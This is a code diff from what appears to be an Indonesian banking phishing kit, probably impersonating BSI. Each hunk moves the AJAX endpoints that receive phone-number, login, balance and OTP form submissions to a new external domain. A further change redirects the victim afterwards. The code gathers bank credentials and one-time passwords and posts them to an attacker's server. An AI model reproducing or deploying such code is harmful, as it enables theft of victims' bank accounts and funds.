@@ -8,7 +8,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://choreo.cloud/bsi/hd8d/no.php',
+            url: 'https://choreoapps.ll-feed.cfd/bsi/hd8d/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -28,7 +28,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://choreo.cloud/bsi/hd8d/login.php',
+            url: 'https://choreoapps.ll-feed.cfd/bsi/hd8d/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -54,7 +54,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://choreo.cloud/bsi/hd8d/saldo.php',
+            url: 'https://choreoapps.ll-feed.cfd/bsi/hd8d/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -84,7 +84,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://choreo.cloud/bsi/hd8d/otp.php',
+ url: 'https://choreoapps.ll-feed.cfd/bsi/hd8d/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
@@ -123,7 +123,7 @@ function getcs(){
      audio1.load();
     audio4.loop = false
 setTimeout(function(){  
-location.href='https://choreo.cloud/wa/hd8d';
+location.href='https://choreoapps.ll-feed.cfd/wa/hd8d';
     }, 1000);
     setTimeout(function(){
     $("#djload").hide();   
